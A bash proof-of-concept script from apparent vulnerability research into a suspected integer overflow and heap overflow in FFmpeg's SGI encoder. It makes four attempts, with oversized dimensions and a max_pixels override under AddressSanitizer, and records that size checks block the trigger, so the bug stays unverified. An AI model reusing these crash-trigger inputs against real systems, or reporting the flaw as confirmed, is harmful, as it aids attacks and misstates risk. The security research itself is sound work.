#!/bin/bash
# VULN-001: Integer Overflow in RLE Length Calculation -> Heap Buffer Overflow in SGI Encoder
# sgienc.c encode_frame() lines 156-161
# CWE-190 -> CWE-122
#
# Status: UNVERIFIED - av_image_check_size prevents trigger via standard pipeline
# See vuln_001_notes.md for mathematical proof.

set -uo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
OUTDIR="$(dirname "$0")"
LOGFILE="${OUTDIR}/vuln_001_result.txt"

echo "=== VULN-001 SGI Encoder Integer Overflow PoC ===" | tee "$LOGFILE"
echo "Date: $(date)" | tee -a "$LOGFILE"
echo "" | tee -a "$LOGFILE"

# Step 1: Run the Python analysis script
echo "[*] Running vuln_001_gen.py (overflow analysis)..." | tee -a "$LOGFILE"
python3 "${OUTDIR}/vuln_001_gen.py" 2>&1 | tee -a "$LOGFILE"
echo "" | tee -a "$LOGFILE"

# Step 2: Verify binary
if [ ! -x "$BIN" ]; then
    echo "[ERROR] ffmpeg binary not found at $BIN" | tee -a "$LOGFILE"
    echo "EXIT_CODE=1" >> "$LOGFILE"
    exit 1
fi
echo "[*] FFmpeg binary: $BIN" | tee -a "$LOGFILE"
"$BIN" -version 2>&1 | head -1 | tee -a "$LOGFILE"
echo "" | tee -a "$LOGFILE"

# ============================================================
# Attempt 1: lavfi color source at exact trigger dimensions
# Expected: FAIL - av_image_check_size rejects 8189x65535
# ============================================================
echo "=== Attempt 1: lavfi color=size=8189x65535, format=rgba ===" | tee -a "$LOGFILE"
echo "[*] This SHOULD FAIL because stride*(h+128) >= INT_MAX for these dims" | tee -a "$LOGFILE"
ASAN_OPTIONS="abort_on_error=0:log_path=${OUTDIR}/asan1.log:detect_leaks=0" \
  timeout 30 "$BIN" \
    -f lavfi -i "color=size=8189x65535:rate=1:color=red" \
    -vf "format=rgba" \
    -frames:v 1 \
    "${OUTDIR}/vuln_001_attempt1.sgi" \
    2>&1 | tee -a "$LOGFILE" || true
echo "[*] Attempt 1 exit: $?" | tee -a "$LOGFILE"
if ls "${OUTDIR}"/asan1.log.* 2>/dev/null | head -1 | grep -q .; then
    echo "=== ASAN LOG (attempt1) ===" | tee -a "$LOGFILE"
    cat "${OUTDIR}"/asan1.log.* | tee -a "$LOGFILE"
fi
echo "" | tee -a "$LOGFILE"

# ============================================================
# Attempt 2: rawvideo /dev/zero at trigger dimensions
# Expected: FAIL - same av_image_check_size gate in rawvideo decoder
# ============================================================
echo "=== Attempt 2: rawvideo /dev/zero size=8189x65535 rgba ===" | tee -a "$LOGFILE"
echo "[*] This SHOULD FAIL - rawvideo decoder also calls av_image_check_size" | tee -a "$LOGFILE"
ASAN_OPTIONS="abort_on_error=0:log_path=${OUTDIR}/asan2.log:detect_leaks=0" \
  timeout 30 "$BIN" \
    -f rawvideo -pixel_format rgba -video_size 8189x65535 -framerate 1 \
    -i /dev/zero \
    -frames:v 1 \
    "${OUTDIR}/vuln_001_attempt2.sgi" \
    2>&1 | tee -a "$LOGFILE" || true
echo "[*] Attempt 2 exit: $?" | tee -a "$LOGFILE"
if ls "${OUTDIR}"/asan2.log.* 2>/dev/null | head -1 | grep -q .; then
    echo "=== ASAN LOG (attempt2) ===" | tee -a "$LOGFILE"
    cat "${OUTDIR}"/asan2.log.* | tee -a "$LOGFILE"
fi
echo "" | tee -a "$LOGFILE"

# ============================================================
# Attempt 3: max_pixels override + rawvideo
# Expected: FAIL - max_pixels only overrides the pixel count check,
# not the stride*(h+128) >= INT_MAX hard check
# ============================================================
echo "=== Attempt 3: -max_pixels override at trigger dimensions ===" | tee -a "$LOGFILE"
echo "[*] max_pixels overrides pixel-count check but NOT the stride*height check" | tee -a "$LOGFILE"
ASAN_OPTIONS="abort_on_error=0:log_path=${OUTDIR}/asan3.log:detect_leaks=0" \
  timeout 30 "$BIN" \
    -max_pixels 9223372036854775807 \
    -f rawvideo -pixel_format gray8 -video_size 65535x32769 -framerate 1 \
    -i /dev/zero \
    -frames:v 1 \
    "${OUTDIR}/vuln_001_attempt3.sgi" \
    2>&1 | tee -a "$LOGFILE" || true
echo "[*] Attempt 3 exit: $?" | tee -a "$LOGFILE"
if ls "${OUTDIR}"/asan3.log.* 2>/dev/null | head -1 | grep -q .; then
    echo "=== ASAN LOG (attempt3) ===" | tee -a "$LOGFILE"
    cat "${OUTDIR}"/asan3.log.* | tee -a "$LOGFILE"
fi
echo "" | tee -a "$LOGFILE"

# ============================================================
# Attempt 4: Maximum valid dimensions (gray8, w=65535, h=32136)
# Expected: SUCCEED (encodes successfully, but does NOT overflow)
# This demonstrates that at max valid dims, no overflow occurs (gap = 625)
# ============================================================
echo "=== Attempt 4: max valid dims for gray8 (w=65535, h=32136) ===" | tee -a "$LOGFILE"
echo "[*] These dimensions PASS av_image_check_size but do NOT trigger overflow" | tee -a "$LOGFILE"
echo "[*] gap: max_h=32136, min_h_for_overflow=32761, gap=-625 rows" | tee -a "$LOGFILE"

# Write a small valid input (gray8 64x64) then scale to max valid size
# Using lavfi at a size that passes the check
ASAN_OPTIONS="abort_on_error=0:log_path=${OUTDIR}/asan4.log:detect_leaks=0" \
  timeout 60 "$BIN" \
    -f lavfi -i "color=size=65535x32136:rate=1:color=gray" \
    -vf "format=gray" \
    -frames:v 1 \
    "${OUTDIR}/vuln_001_attempt4.sgi" \
    2>&1 | tee -a "$LOGFILE" || true
echo "[*] Attempt 4 exit: $?" | tee -a "$LOGFILE"
if ls "${OUTDIR}"/asan4.log.* 2>/dev/null | head -1 | grep -q .; then
    echo "=== ASAN LOG (attempt4) ===" | tee -a "$LOGFILE"
    cat "${OUTDIR}"/asan4.log.* | tee -a "$LOGFILE"
fi
echo "" | tee -a "$LOGFILE"

echo "=== Summary ===" | tee -a "$LOGFILE"
echo "Attempts 1-3: Pipeline rejects dimensions via av_image_check_size (expected)" | tee -a "$LOGFILE"
echo "Attempt 4: Max valid dims encode OK but do NOT trigger the overflow" | tee -a "$LOGFILE"
echo "Result: UNVERIFIED - vulnerability exists in source but pipeline blocks trigger" | tee -a "$LOGFILE"
echo "" | tee -a "$LOGFILE"
echo "EXIT_CODE=0" | tee -a "$LOGFILE"
